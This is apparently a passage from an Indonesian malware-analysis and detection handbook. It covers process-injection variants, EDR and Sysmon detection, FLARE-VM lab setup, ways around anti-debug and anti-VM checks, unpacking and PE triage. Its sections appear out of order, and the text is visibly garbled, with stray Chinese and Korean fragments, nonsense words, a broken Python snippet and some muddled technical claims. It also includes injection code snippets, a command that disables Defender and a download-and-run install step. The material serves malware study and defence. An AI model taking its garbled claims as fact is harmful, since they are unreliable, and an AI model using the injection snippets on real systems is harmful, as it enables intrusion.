// 3. EnumThreadWindows
// 4. GrayStringA/W     — begitu bitmap aktaraksis, PVOID lpFunc
// 5. LineDDA           — epsilon-argumen callback
// 6. EnumResourceNames / EnumResourceLanguagesW
// 7. sehingga RaiseException +VectoredHandler terus berlanjut
```

Implikasi forensik: payload callback `EnumWindows` dieksekusi dalam thread **pemanggil**, bukan thread baru. Ini berarti transaksi frame injeksi muncul pada stack log tak wajar — frame `EnumWindows` tak pernah muncul di callstack thread victim yang statis.

### 7.10.2 Vectored Exception Handler (VEH) sebagai trampoline

```c
// Jika VEH sudah diinstal oleh Malware sebelumnya / DLL proxy:
// 1. Tulis payload ke .TX di target
// 2. RaiseException(0x1234, 0, 0, NULL)
//    -> ExceptionContext->Rip di-overwrite oleh VEH ke payload.
// Deteksi: exception code custom + VEH yang menjalkan RIP,
// stack walk menunjukkan KERNELBASE!RaiseException->payload.
```

### 7.10.3 Eksploitasi `__lib_log` TIDAK — jebakan umum

Kayu callback `LoadLibraryA` memerlukan **peredictable** ordinal stack alignment pada x64. pCaller from wrong TEB/RBX pada sesi COM MTA membuat payload/callback NPE singkat: mitigasi harus me-stacksim context (lihat Thread Hijacking di 7.11).

## 7.11 Thread Hijacking — Varian dan Edge Case

### 7.11.1 `SetThreadContext` + `ReactOS`-style

1. `NtGetContextThread` → save `RIP`, `RSP`
2. Tulis `RIP` = payload
3. Set `RSP` dan stack framing agar payload bisa `ret` ke `saved_rip`
4. `NtResumeThread`

Deteksi EDR menyimpan via **ETW**:

| Source | Peristiwa |
|---|---|
| `Microsoft-Windows-Kernel-Process` | Skipped. |
| `Microsoft-Windows-Kernel-Audit-API` | — |
| Sysmon EID 8 (CreateRemoteThread) | **tidak** di-set |
| Sysmon EID 10 (ProcessAccess: `SetThreadContext` bit 0x0010) | muncul bersamaan dengan 0x0008 (ProcessSuspend) |
| ETW `Microsoft-Windows-Kernel-Thread` | khusus OS≥Win11, context-change flush |

### 7.11.2 Schedule hijack via `NtSetInformationThread(ThreadBreakOnTermination)`

Dalam melibatkan OS `RsWindows` lama: `ThreadBreakOnTermination` men-trigger Bugcheck 0xF4 saat thread exit sehingga bisa dipakai force-register ke `KiExceptionPort` — hanya cocok untuk crash-payload政府采购 mainstream.

### 7.11.3 Hijack via `RtlRemoteCall` — fungsi asli (undocumented ktmtzx)

```c
// ntoskrnl – kernel32: tidak ada di managed...
// Ekspor di ntdll.exe !RtlRemoteCall pilih; marshal蓉 akselerasi:
//  * menggunakan stack yang diberikan server ke target thread
//  * callback dikenali melalui `MessageBox` style

status = RtlRemoteCall(hProcess, hThread, StartAddress,
                       0, NULL, TRUE, FALSE); // ParameterBuffer kosong
```

Deteksi: perilaku ruang-user oleh Elastic: parking yang maju, tandanya:
- `Wow64`-call stack shows `wow64cpu!...-> ntdll!RtlRemoteCall`
- Proses injeksi supersource: `PROCESS_MITIGATION_IMAGE_LOAD_POLICY_BLOCK` oleh

### 7.12.1 Klasik `NtMapViewOfSection` (review sekitar pointer)

Rincian per rumpun versi OS:

| Sistem | `sec.Commit` payload .clear memabcdefghijklmnop预测 | cache penuh side-channel |
|---|---|---|
| Win10 1809 | `SEC_COMMIT` standalone, kunci `FlsIndex` | — |

| Win11 21H2+ | miti satel `PagesWriteable` TFM (`APC_ProhibitExecToSelfMap`) set default AFD lax | `NtCreateSection` dengan `PAGE_EXECUTE_*` tanpa file backing masuk Bitmap `MiImageProtection Faults` — fires Sysmon ID 18 tapi section hides |

### 7.12.2 Latest edge case windows 24H2

windows 24H2 membuat reapat angsi:

- Requires break in武功 hPrecomputedMapping: `SEC_RESERVE`, lalu `NtProtectVirtualMemory` di dalam corong target — dengan other-process handle-based, halamanCreate enforcement.

## 7.13 Process Doppelganging — note per produk AV/EDR

| Produk | Kendala yang muncul pada Doppelganging |
|---|---|
| CrowdStrike Falcon | behavior: `CS-ProcessDoppelganging-CLASSIC` mengiksir pada `NtCreateSection`-nya transaction menutup file stagen (flag di R3 host) |
| SentinelOne | mengites tengah: sysmon `(SectionCreate: file=\\C:\\Users\\...\\file.dat)` absence |
| Windows Defender ATP | Incident **"Suspicious process creation (Process Doppelganging)"** berwarna disasadasarkan `NTFS transaction rollback correlated with image load` |
| Sophos | transactile `T1574.012` |

### Root cause detectable

- TxF **deprecated**; driver `TxF` tidak lagi `(NTFS) TxF voluntary` sejak Win10 RS3, dan di **Server 2022/Win11 TTx dimusnahkan total** (API return `ERROR_TRANSACTIONAL_OPEN_NOT_SUPPORTED`). Harus doortrustedness: `PHANTOM` (T1564.004.中被消)。
- Workaround yang diadopsi operator: **DCM** (Direct Composition Mapping) — swap ke `NtComposition untuk Peb` deliver payload: dua process set `DComp` visual target shared-section handles mem硬 kandikan `DirectComposition` callback.

## 7.14 Fiber Injection — peptide

Fiber mapnya terikat tl ISR tiap `<stack_limit>` ke `t_fiber` EFIGina per-.rdata:

```c
LPVOID f = CreateFiber(0, (LPFIBER_START_ROUTINE)payload_addr, NULL);
// Target harus memiliki:
//  * Thread running CT loop (ConvertThreadToFiber sudah dilakukan)
//  * Ini berarti proses injeksi TIDAK dilakukan dari luar — fiber injection
//    adalah in-proc lateral movement/EDR evasion stage setelah initial access.
SwitchToFiber(f);
```

Jebakan: 
1. Fiber callstack profiler (eBPF/EventPipe) menyimpan anomali
2. `FlsAlloc` vftable dalam `RtlFlsHeap` bergambar; memori baca, klasifikasinya `leak` jika pinned static

## 7.16 Mitigasi yang memutus teknik secara spesifik

- **CFG (Control Flow Guard)**: br daftar callback injection. Target proses dengan CFG enabled akan `__guard_dispatch_icall` fungsi callback unknown → `STATUS_STACK_BUFFER_OVERRUN` bugcheck; tapi hanya jika callback **bukan** signed `RAX` hold. Main cause callback injection gagal modern.
- **ACG (Arbitrary Code Guard)**: blok mapping injection & hollowing payload `RX` standards.
- **EAF**: blok Read of PEB writing LDR segghost & hollowing.
- **ProcessSignaturePolicy**: DLL-only signed Microsoft; LoadLibraryA injection returns error.

Jebakan operasional: developer inici 산 `UpdateProcThreadAttribute` dengan `PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY` tapi lupa `high entropy` parameter yan部set — mitigasi thread kadang tidak aktif ketika dll pindah konteks — **satu-satuna verifikasi** adalah mengeja `NtQueryInformationProcess` dengan `ProcessMitigationPolicy` (`36`) dan bukan dianggap dari attribute.

---

## 7.17 Kesalahan Forensik Umum

1. Scoping E8 `SourceImage` tanpa pivot ke `E10` ini melewatkan double-hop (injeksi via chain migrator)
2. Double quote di `TargetImage` dengan spasi (`C:\Program Files\...`) — parsing CSV yang tidak `.jar`-aware menghasilkan misattribusi
3. `StartAddress` di E8 adalah VA target, tidak module-relative, jika `StartModule` dikosongkan% artifacts: dll mencoba hash buffer dan gagal ketika process exit rapid (race di temp sender) — sebab instruksi `StartModule` NULL **bukan** indikator shellcode necessarily.

### 1.1 Spesifikasi Host & Guest

### 1.2 Deploy FLARE-VM

```powershell
# Jalankan di guest Windows yang fresh, snapshot sebelum install
Set-ExecutionPolicy Unrestricted -Force
(New-Object net.webclient).DownloadFile('https://raw.githubusercontent.com/mandiant/flare-vm/main/install.ps1','C:\install.ps1')
cd C:\
Set-MpPreference -DisableRealtimeSecurity $true   # Defender harus mati
.\install.ps1 -passThru -CustomVer "redteam-lab-2025"
```

- Installer: `install.ps1` dari repo `mandiant/flare-vm` (main branch, commit terakhir diuji 2025).
- Restart guest beberapa kali selama install. Durasi: 1–3 jam tergantung bandwidth.
- Setelah selesai: **snapshot bersih**. Semua analisis selanjutnya revert ke snapshot ini.

### 1.3 Deploy REMnux (simulator network)

```bash
# REMnux 7.x sebagai VM terpisah di topologi host-only
apt update && apt install inetsim
```

Konfigurasi kunci `/etc/inetsim/inetsim.conf`:

```
service_bind_address 0.0.0.0
dns_default_ip 192.168.x.x        # IP REMnux di network host-only
dns_fakereply_a 192.168.x.x
http_fakereply_banner Apache/2.4.58
```

Redirect semua DNS guest: reply pointing ke REMnux; semua HTTP/S/TCP diterima dan di-reply dengan banner palsu → malware "berhasil" connect ke C2 karena adanya fake responses.

## 2. Spinners/Penghapus Jejak: Anti-Analisis & Bypass

### 2.1 IsDebuggerPresent & PEB

**Mechanism**: `IsDebuggerPresent` baca field `BeingDebugged` (offset `0x02`) dari `PEB` melalui `FS[0x30]` (x86) atau `GS:[0x60]` (x64).

**Payload ekstraktor di x64dbg**: gadget ekspresi:

```
bp kernelbase!IsDebuggerPresent         # break tiap call
```

**Payload patch manual**:

```python
# Python via x64dbg Python atau script
# x86: FAKE clear BeingDebugged
# struktur: FS:[0x30] -> PEB -> [PEB+0x02] byte
```

Cek manual di memory map:

```
# Jalan manual x86:
# 1. dump FS:[0x30] → alamat PEB
# 2. byte di PEB+0x02: 1 = BeingDebugged aktif
```

**Kenapa gagal bypass manual saja**: banyak sample modern checking BeinDebugged langsung via register tanpa API call (lihat §2.2) — deteksi hanya dengan `sw0rdfish`-style breakpoint API gagal karena check lain tetap jalan.

### 2.2 `NtGlobalFlag`

- Field `NtGlobalFlag` di `PEB+0xBC` (x64) / `PEB+0x68` (x86). Nilai normal `0x0`. Debugger mengeset bit: `FLG_HEAP_ENABLE_TAIL_CHECK (0x10)`, `FLG_HEAP_ENABLE_FREE_CHECK (0x20)`, `FLG_HEAP_VALIDATE_PARAMETERS (0x40)`.
- Kombinasi khas debugged process: `0x70`.
- Kasus nyata: Packed UPX + UPX di Scotch → aktivasi `NtGlobalFlag` ke `0x70` karena `LoaderFlags` aktif saat init debug.

**Payload script ScyllaHide** (plugin x64dbg, versi terbaru tersedia di `github.com/x64dbg/ScyllaHide`):

- Profile: `x64dbg` → enable `NtGlobalFlag`, `NtQueryInformationProcess(ProcessDebugPort/Flags/ObjectHandle)`, `GetTickCount`, `OutputDebugString`, `BlockInput`.
- Setelah attach, pastikan hide-api sudah aktif, sebelum `run` → cek apakah malware tetap jalan (tidak exit early → bypass aman).

**Payload YARA untuk static quick-check sample**:

```yara
rule IsDebuggerPresent_Pattern
{
    strings:
        $1 = { 64 A1 30 00 00 00 }              // mov eax, fs:[0x30]
        $2 = { 65 48 8B 04 25 60 00 00 00 }     // mov rax, gs:[0x60]
        $3 = { 0F B6 40 02 }                    // movzx / check byte+2
        $4 = "IsDebuggerPresent"
    condition:
        uint16(0)==0x5A4D and 2 of ($1,$2,$3,$4)
}
```

### 2.3 Anti-VM (deteksi hypervisor)

| Deteksi | Callback payload | Bypass |
|---|---|---|
| CPUID hypervisor bit | `CPUID` leaf 1, ECX bit `5` | Set `hypervisor present = false` via VMware config (`cpuid.1.ecx="-- --:--:-:--:-:--:-"`) |
| VMware I/O port magic | `in eax, dx` dengan `VX` 0x5658 pada port 0x5658, return `56 4D 58 68` | Edit `.vmx`: `monitor_control.restrict_backdoor = "TRUE"` (memutus backdoor-vmwarelegacy, tapi teraplikasi di VMware Workstation 17.x+ sebelum `vmwarekbe.modpath` deprecated) |
| Registry key | `HKLM\HARDWARE\DESCRIPTION\System\BIOS\SystemManufacturer` = "VMware Inc." | Regedit rename atau `reged-it` via pafish-line tooling |
| File system | `C:\Windows\System32\Drivers\vmci.sys`, `vmmouse.sys` | Del via `driverquery` offline, rename DLL driver |
| MAC OUI | `00:0C:29`, `00:50:56`, `00:05:69` | Edit `.vmx` `ethernet0.address = "XXX:XX..."` ke OUI fisik atau spoof via Device Manager |
| User temperatur | `wmic bios get serialnumber` → "VMware-" | Regedit serialnumber change |
| Sleep timing | `Sleep` besar >> `GetTickCount` delta besar di VM (scheduling overhead) | `tools > disable time sync`; atau patch API sleep delta via hook |

**Bug detection itself**: test lab dengan **pafish** (`github.com/a0rtega/pafish`, versi 2.9):

```
# Di guest: jalankan pafish_x64.exe
```


### 2.4 Timing-based anti-analysis

| Check | Ciri | Bypass |
|---|---|---|
| `rdtsc` delta antar 2 perintahan | Loop rdtsc1; sleep/hook; rdtsc2; compare > threshold | ScyllaHide `rdtsc` mode: hide delta, atau patch conditional jump |
| `GetTickCount` sub | Compare delta eksplisit (dari debugger `RunToUser` delay) | ScyllaHide: `GetTickCount抑制剂` jitter inject |
| `QueryPerformanceCounter` | Sama, presisi tinggi | Hook di userland, feed nilai palsu konsisten |

### 2.5 Workflow anti-analysis bypass (langkah demi langkah)

1. STATIC pre-check: YARA anti-debug/anti-VM pattern (rule baca §6.2). Tandai offset check.
2. Load di x64dbg, set breakpoint di `IsDebuggerPresent`, `CheckRemoteDebuggerPresent`, `NtQueryInformationProcess`.
3. Attach **ScyllaHide** profile " aggressif" sebelum run.
4. Jika sample keluar/crash: dump `x64dbg → Trace → Trace into` untuk mencari check section; cari `fs:[0x30]`, `gs:[0x60]`, `cpuid`, `in dx` di trace.
5. Set `rflags` atau patch `jz/jnz` hasil check (API-free check di-patch manual, opsi lain `plugins → ScyllaHide → Options → advanced hook`).
6. Re-run, konfirmasi malware lewat check dan lanjut eksekusi (default page, unpacking, C2 connect).

## 3. Unpacking: Dumping Memori & Rekonstruksi IAT

### 3.1 Sobel Memori dengan `x64dbg` + `Scylla` (workflow manual)

4. Sample packed (UPX-PHAT/photo, Themida-lite, custom packer):
5. Load di x64dbg, breakpoint di `VirtualProtect` dan `VirtualAlloc`. Section baru RWX / permintaan PAGE_EXECUTE_READWRITE = kode unpacked diletakkan di memory.
6. Set hardware breakpoint pada memory write → `dump` segment kode; atau tunggu OEP JIT: ukur heuristik seperti "section entrypoint tidak match static EP" → trace `run → pause pada write ke RWX buffer`.
7. Setelah OEP ditemukan (ret dari packer stub → code user yang terlihat seperti compiler makeup), lakukan memory dump → `x64dbg → right-click → Dump Memory to File`.
8. Sentuh `Scylla` (Scylla_x64 0.9.4k atau successor `ScyllaWrapImp`):
   - `OEP` address (masukkan OEP yang ditandai).
   - `IAT Autosearch` → `Get Imports`.
   - `Dump` pilih dump → `PE Rebuild` → fixed dump file.

### 3.2 Rekonstruksi IAT: kenapa perlu & cara kerja

- **Masalah**: packer menghancurkan IAT statik, mengganti entries dengan dispatcherroutine internal, atau thunk ke stub yang bertugas `LoadLibrary`+`GetProcAddress` dinamis. Dump memori → IAT jalan tapi penuh stub internal, tidak bisa di-disassemble di IDA static.
- **Cara kerja Scylla IAT Autosearch**:
  1. Baca original entrypoint + scan memory range untuk thunk tables (pointer yang jika dereference berada di module loaded range).
  2. Follow thunks yang valid → module name ditemukan → resolve `Function` address ↔ WinDbg `xi` symbol → import name.
  3. Rust invalid pointers (garbage/uninitialized thunk) → exclude.
- **Owner mode instancing**: gunakan **64-bit** Scylla untuk PEs 64-bit (32-bit Scyllasilahkan untuk p32). IAT dump x86 vs x64 offset berbeda (`IMAGE_THUNK_DATA64` 8-byte).

### 3.3 Dump dasar instruksi untuk IAT manual fix

```python
# example manual IAT entry fix-post-dump, python + pefile
import pefile
pe = pefile.PE("dumped_unpacked.bin")
for entry in pe.DIRECTORY_ENTRY_IMPORT:
    print("Module:", entry.dll)
    for imp in entry.imports:
        print(hex(imp.address), imp.name)
```

Cek validity: `pe.parse_data_directories()` → jika `imp` resolve ke `kernel32.dll!LoadLibraryA` OK; jika beberapa handler tidak ditemukan → masih ada "unpacker-stub" saat dumping.

### 3.4 Unpacking otomatis: CAPE

CAPE `processing` (cape → proc_tree → behavior, dumping) akan:
- **dump setiap `PE` baru yang muncul di memori process** (moduluntuk injection → simpan).
- **Unpacker module** (`CAPE/processing/parser <ohcуме№>`) melakukan heuristik: perubahan memory (allocation + write + execute), dump PE setelah OEP detection (execution from RWX area).
- Ini beroperasi otomatis (configuration: `memory_dump = yes`).

**Hasil teks**: report `CAPE/report.json`:

```json
{
  "detections": ["auto"],
  "dumps": ["dump.pid1234_.660000.bin"],
  "CAPE": {"configs": [{"family": "Emotet", "c2": {"184.x.x.x:8081"}}]}
}
```

## 4. Deteksi Process Hollowing / Process Injection

Deteksi berlapis: dinamis dari lab monitoring context, dan dari endpoint (di lab dan pada infrastructural exercise: assume buying SOC detection engineering).

### 4.1 Ciri process hollowing di lab

Terlihat di Procmon/Procexp/Sysmon:

1. Parent process (e.g. `sample.exe`) membuat `svchost.exe`/`explorer.exe` via `CreateProcess` dengan flag `CREATE_SUSPENDED`.
2. Terhadap process `zombie` ini: `NtUnmapViewOfSection`/`WriteProcessMemory` terjadi (lihat di API Monitor / x64dbg multi-proc).
3. `SetThreadContext` → RIP/E relocasi ke target address.
4. `ResumeThread` → payload mengganti kontrol modul target ∴ process hijack selesai.
5. Dalam Sysmon: `EventID 10 ProcessAccess` dengan `GrantedAccess 0x1010/0x1F0FFF` pada PROCESS_VM_WRITE/VIA_VM_OPERATION.

### 4.2 Investigasi citrus guest: Sysmon config payload

Injeksi sysmonconfig-export.xml relevant excerpt (sysmon 15.x konfigurasi `SwiftOnSecurity` fork lab internal):

```xml
<ProcessAccess onmatch="include">
    <Rule name="sus WriteProcessMemory" relation="is any">
        <GrantedAccess condition="is any">0x1F0FFF,0x1010,0x0810,0x0010</GrantedAccess>
        <CallTrace condition="contains unknown">UNKNOWN</CallTrace>
    </Rule>
</ProcessAccess>
```

Sysmon Event 10 event fields penting: `SourceImage`, `TargetImage`, `GrantedAccess`, `CallTrace`.

### 4.3 Response ke posisi mit tahun

Setelah sysmon Event 10 fires:

| Langkah | Command | Expektasi |
|---|---|---|
| Dump pro target | `procdump -ma <pid>` (Sysinternals 6.x) | File dump penuh; malware dapat di-identifikasi |
| Live view injected | `pe-sieve64.exe /pid <pid> /imp 2 /data 2` | Dump modul anomali+`/imp 2` rekonstruksi IAT |
| Cek module | `listdlls -p <pid> | findstr /i xm` | Module non-signed |

`pe-sieve` (hasherezade, versi 0.3.x+) adalah alat de-faktor undefined modules & hollowed process detection; output: file dengan pattern `*.exe` + `cat "hollowed" report`.

### 4.4 Inference framework mapping ke MITRE ATT&CK

| Teknik | ID | Sysmon event |
|---|---|---|
| Process injection – classic `CreateRemoteThread` | T1055.001 | E8 (image), E10 (access) |
| Process hollowing | T1055.012 | E10 `NtUnmapViewOfSection` via CallTrace; E7 (image) |
| APC injection | T1055.004 | E8 (image+commandline) |
| Thread execution hijacking | T1055.003 | E10 + E25 |

## 5. Workflow End-to-End (langkah demi langkah)

```
[0] Preparasi
 ├─ Revert VM ke snapshot bersih (FLARE-VM terinstal, Defender OFF, sysmon ON)
 └─ Verifikasi: pafish run → hasil deteksi hanya CPUID/VX minimal
 
[1] Triage statik cepat (< 10 menit)
 ├─ Hash: `Get-FileHash sha256 sample.exe`
 ├─ VirusTotal  (hash lookup saja, jangan upload sample client)
 ├─ PE-bear: sections (RWX), entropy (> 7 = packed), imports
 ├─ YARA rules internal: packer-id, anti-debug, anti-VM
 └─ floss / captcha strings hint

[2] Setup monitoring
 ├─ Procmon + filter  `Process Name is sample.exe`
 ├─ Wireshark di REMnux/gateway  auto
 ├─ Sysmon log live tail:  `Get-WinEvent -LogName Microsoft-Windows-Sysmon/Operational -MaxEvents 50`
 └─ API Monitor attach later (optional, kadang mengganggu)

[3] Detonation manual
 ├─ Attach ScyllaHide di debugger (jika planning debug session)
 ├─ Run sample → observe:
 │   ├─ (1) JAXB: UAC prompt? Registry persistence? (Sysmon E13, E12, E11)
 │   ├─ (2) Procexp tree: spawn anak? hollow pattern (suspended process)?
 │   └─ (3) Wireshark: DNS beacon, HTTP download stage-2
 └─ Jika exit-silent: anti-analysis bypass → balik ke §2

[4] Unpacking jika sample packed
 ├─ Breakpoint VirtualAlloc/VirtualProtect →  single-step ke OEP heuristik
 ├─ Dump memory → Scylla (fix IAT, fix dump)
 └─ Off-line: IDA 8.4+ / Ghidra 11.x static analysis untuk families

[5] Injection/hollowing response jika stage-2 muncul
 ├─ Sysmon E10 alert → identify target pid
 ├─ procdump -ma target
 └─ pe-sieve → extract injected payload

[6] Network behavior
 ├─ Fakenet-NG config protokol default → Gmail HTTP patterns, services files
 └─ Analisis C2 protocol → curl replay, config extraction
```

### 5.1 Contoh vektor: Browser DLL injection

Sample menarget Chrome 131 (x64, `chrome.exe`):

| Definisi | Layer |
|---|---|
| `DllHost` | Chrome sudah selesai initialization → spawn child `chrome.exe` (suspended), hollowed with DLL: |
| Sysmon trace | E8: parent `sample.exe`, cmd `chrome.exe --type=renderer ...` → E10 WriteProcessMemory → E25 dup thread start |

Bypass kuinesi: pastikan PROHIBITED actions in lab reaktif adalah jangan side-effect.

## 6. Artefak & Cheatsheet Perintah

### 6.1 Dump & analisis

```cmd
procdump -ma <pid> dump.dmp
strings dump.dmp | findstr /i http
pe-sieve64 /pid <pid> /dir results /imp 2
reg save HKLM\SOFTWARE\Microsooft\Windows\CurrentVersion\Run run_backup.hiv
```

### 6.2 x64dbg command quick-ref

```
bp VirtualAlloc                  ; breakpoint API
bc VirtualAlloc                  ; clear
hw $addr                          ; hardware bp (anti-anti-debug safe)
gu                               ; go up to caller
rt                               ; run to return
dump $addr                        ; open dump at expr
find 00400000, 4D 5A              ; find MZ header (packed section scan)
```

**Kenapa `hw` aman vs software bp**: hardware breakpoint via DR registers tidak menulis `0xCC` di kode, aman dari CRC self-check.

### 6.3 Registry forensics quick

```cmd
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
 Autoruns64.exe -a * -h -m \\<host> -o autos.csv
```

## 7. Jebakan Operasional (membuat teknik ini GAGAL di lapangan)

1. **ScyllaHide yang tidak dikonfigurasi menyebabkan exit senyap** — malware terdeteksi karena beberapa obfuscator juga check presence lain (sehingga ScyllaHide sendiri terdeteksi); bypass yang berlebihan memicu tripped time check (SandboxScout). Test patch minimal per check yang benar-benar ada di sample.
2. **Isolation bypass**: malware yang men-translate ke guest-to-host (VMware tools active, shared clipboard atau host-only adapter dimatikan per test case yang tertinggal), mengirim subnet real → membuat real-world leakage, data-visible di network produksi.
3. **NtGlobalFlag bypass tapi ProcessHeap Flags terlewat**: setelah patch NtGlobalflag, `ProcessHeap->Flags` (offset `0xC` heap, flag `0x40000060`) dan `ForceFlags` masih menunjukkan debugged state. Dump OEP valid tapi sample jalan berbeda (belum penuh unpacked).
4. **Defender "OFF" tidak pernah benar-benar OFF**: Windows 11 24H2 → `Set-MpPreference -DisableRealtimeSecurity $true` bisa diredirect oleh sandbox smart screen; verify `Get-MpComputerStatus`. FLARE-VM install gagal untuk beberapa program karena driver interseksi. Solusi: uninstall via `Uninstall-WindowsFeature`-not-microsoft `defender` di Windows 10 22H2 variant lab, install kembali utility tools ingin diuji "ngomong" dengan Defender.
5. **Sample stage-2 membutuhkan gateway data real sebelum unzip**: Fakenet-NG reply kosong mungkin ditolak; pesan error "config invalid" dipaket. Solusi: sediakan contoh response (GET `/api/config` reply dengan expected-schema).
6. **VM-escape detection → perubahan profil waktu**: malware sleep besar (30 detik-x loop) menunggu inert. CAPE default timeout 180 detik; penyesuaian di `analysis.conf` `timeout=1200`.
7. **Malware multistage dengan C2 bocking**: ransomware bind kontaminasi → jangan pernah detonasi sample jenis ini di lab; uji hanya di env disposable penuh (throwaway), penting akses ke snapshot.
8. **.vmx hardening breaking VMware Tools**: `monitor_control.disable_btpriv = TRUE` membuat beberapa aplikasi modern (Chrome 131) trigger GL fault di virtual instance perf workaround; uji guest dua profile: generic (tools aktif) dan hardened-cold (tools disable) internat.
9. **pe-sieve false-positive**: Chrome 138 dan aplikasi lambat JICT (Just-in-time) memuat ammonit-basi self-modifying benign; selidiki `scan_report` pe-sieve: modul `HOLLOWED` di Electron/Chromium adalah normal signals (renderer allocations). Validasi via chain-process-tree.
10. **Sysmon CallTrace `UNKNOWN`**: beberapa injektor injection via `NtMapViewOfSection` tidak melalui `WriteProcessMemory` — Sysmon Event 10 belum tentu mendaftar target. Terapkan kedua E10 + ETW `Microsoft-Windows-Kernel-Process` channel untuk menangkap mapping-cross-process.
11. **GeoIP/HTM require live region**: banyak bot setelah melihat jaringan replica C2 non-aktif menulis beberapa pembatalan: lain waktu. INetSim menyediakan banner palsu lebih sedikit dibanding asli (TLS 1.3 handshake SAN mismatch). Use mitmproxy arsitektur: Suricata di REMOX + Tために chew `CA` lab sehingga trafik HTTPS bisa MIITM.
12. **Malware melakukan sinkhole pada lag kendala hypervisor**: jika CPU lab underverdload, sample fragil (race conditions) crashing, kita salah label "sample broken". Verify list logikal: detonasi lagi pada host dengan provision awal atau CAPE worker yang tidak overloaded (`cape.conf maxcpus-per-vm`).

## 8.2 Triage Cepat dengan DIE

**Apa yang dikirim:**
```bash
diec.exe -e -a -d sample.exe   # entropy, semua signature, deep scan
```

**Apa yang muncul:**
```text
PE32
  Protector: UPX (3.96) [signature: UPX0, UPX1, UPX!]
  Compiler: MSVC (19.29.30133) [link 14.29]
  Entropy: 7.82 (section UPX1)
```

**Kenapa berhasil:** DIE match signature byte statis di header/file + heuristik nama section. Entropy > 7.0 pada section kode hampir selalu = compressed/encrypted.

**Kenapa gagal:** Custom packer tanpa signature publik muncul "Nothing detected" — jangan percaya hasil negatif DIE. UPX modifikasi (anti-DIE anti-UPX patch) tetap terdeteksi tapi unpack manual gagal dengan `upx -d`.

---

## 8.3 PE Header Parse (PE-bear)

**Apa yang dikirim:** buka sample di PE-bear, fokus ke:
1. **DOS Header** — `e_magic = MZ`, `e_lfanew` offset (valid: 0x40–0x200)
2. **NT Header** — `TimeDateStamp` (bogus jika uniform `0x55555555` atau epoch tahun depan), `SizeOfOptionalHeader`
3. **Section Table** — periksa flag anomali:

| Anomali | Indikasi |
|---|---|
| `IMAGE_SCN_MEM_WRITE \| EXECUTE` (0x60000020) | Self-modifying/unpacking |
| Section name kosong/non-standar + entropy ≥ 7.0 | Packer |
| `PointerToRawData = 0` tapi `SizeOfRawData > 0` |irtual section / fileless tample |

**Kenapa berhasil:** malware umum modifikasi invariants PE loader. Loader Windows 11 24H2 sangat toleran (section bisa overlap, header flag bisa inkonsisten) sehingga packer menyalahgunakan slack ini.

---

## 8.4 Section Entropy Manual

**Apa yang dikirim:**
```bash
# Rata-rata entropy per section via radare2
rabin2 -S sample.exe | while read; do :; done
# Atau Python:
python3 -c "
from math import log2
data=open('sample.exe','rb').read()
[print(hex(s.Name_padded.decode(errors='ignore') if False else ''),]
"
python3 <<'EOF'
import pefile
pe = pefile.PE('sample.exe')
for s in pe.sections:
    import math
    d = s.get_data()
    ent = -sum((d.count(b)/len(d))*math.log2(d.count(b)/len(d)) if d.count(b) else 0 for b in set(d))
    print(f"{s.Name.decode().strip('\\x00')}: E={ent:.2f}")
EOF
```

**Output:**
```text
.text: E=6.12      ← kode normal (5.5–6.5)
.rdata: E=5.80
UPX1: E=7.89      ← compressed
.rsrc: E=6.40
```

**Kenapa gagal:** entropy 7.3+ pada `.rsrc` bisa jadi ikon PNG/embedded legit, bukan packed kode. Entropy rendah tidak menutup kemungkinan obfuscation via string stack (Flare-on style).

---

## 8.5 Import Table

**Apa yang dikirim:**
```bash
rabin2 -i sample.exe
# atau pestudio → Imports tab (highlight merah otomatis)
```

**Indikator mining (pestudio blacklist):**

| API | Probable penggunaan |
|---|---|
| `VirtualAlloc` + `VirtualProtect` + `WriteProcessMemory` | Injection / unpacking |
| `LoadLibraryA` + `GetProcAddress` dengan IAT kosong | Resolusi dinamis / packed, IAT asli runtime |
| `RtlUnwind`, anti-debug flags `CheckRemoteDebuggerPresent`, `NtQueryInformationProcess` | Anti-analysis |
| `InternetOpenUrlA`, `URLDownloadToFileA` | Second-stage loader |
| `CryptDecrypt` + `CryptStringToBinaryA` | Payload decryption builtin |

**IAT hanya 2-3 import (kernel32: LoadLibrary/GetProcAddress/ExitProcess)** ⇒ 99% packed atau manually-resolved. Header asli muncul setelah unpack — simpan dump.

---

## 8.6 TLS Callback

**Kenapa penting:** callback TLS dieksekusi **sebelum** entry point (`AddressOfEntryPoint`) — dipakai untuk unpacking dan kill-switch anti-debug.

**Apa yang dikirim:** PE-bear → Data Directories → `TLS Table`:
- `AddressOfCallBacks` (runtime ke pointer array, terminated NULL)
- `AddressOfIndex` (slot index)
- Raw AddressOfCallBacks

**Flip-peforma:** flag `IMAGE_DIRECTORY_ENTRY_TLS` index 9 di OptionalHeader DataDirectory.

**Output:** jika callback ada dan binary adalah packed sample, pindahkan entry analisis ke callback-address, bukan `AddressOfEntryPoint`. Loader Windows (termasuk 24H2) selalu trigger ini sebelum epilogue loader → teknik klasik UPX-modified, Carp/pack DB.

**Gagal:** jika packer zero-out flag di header tapi region `.rdata` punya callback array — loader Windows ignore (header flag mn10), tapi beberapa versi nanami (Crystal) memanggil manual via `TlsAlloc` — periksa call site.

---

## 8.7 Overlay (Appendix Data)

**Apa yang dikirim:** PE-bear → baris terakhir section header → bandingkan `PointerToRawData + SizeOfRawData` terakhir vs `file size`:
```bash
# oto
rabin2 -SSo sample.exe     # overlay offset
xxd -s $OVERLAY_OFFSET sample.exe | head
```

**Apa yang muncul (contoh nyata):** file 2.1MB, last section end = 0x1A0000, sisa 0xC0000 bytes = data overlay magic `MZ` + baru → dropper second stage appended, loader menghitung `(file_size - overlay_marker_offset)` runtime offset.

**Kenapa berhasil:** loader Windows mengabaikan data > mapped size → tempat favorit nyimpan second stage, config, atau implant.

**Action:**`binwalk overlay.bin` untuk carve embedded ZIP/CAB/PE nested.

---

## 8.8 ELF Triage

**Apa yang dikirim:**
```bash
readelf -h sample.elf      # header — periksa e_type (EXEC/DYN), e_entry
readelf -S sample.elf      # section — entropy.check
readelf -d sample.elf       # DT_NEEDED (libc dinamis?), DT_FLAGS (pie?)
objdump -T sample.elf      # dynamic symbol (lekstra imports dt PLT)
readelf -r sample.elf      # reloc GOT hijack
```

**Indikator:**

| Artefak | Indikasi |
|---|---|
| `e_type = EXEC` + `DT_NEEDED` kosong | Statically linked — glibc statically-linked membesar ke ~800KB; mirriadi bounce |
| Section `.text` entropy > 7 | UPX ELF (`UPX!` magic near EOF) |
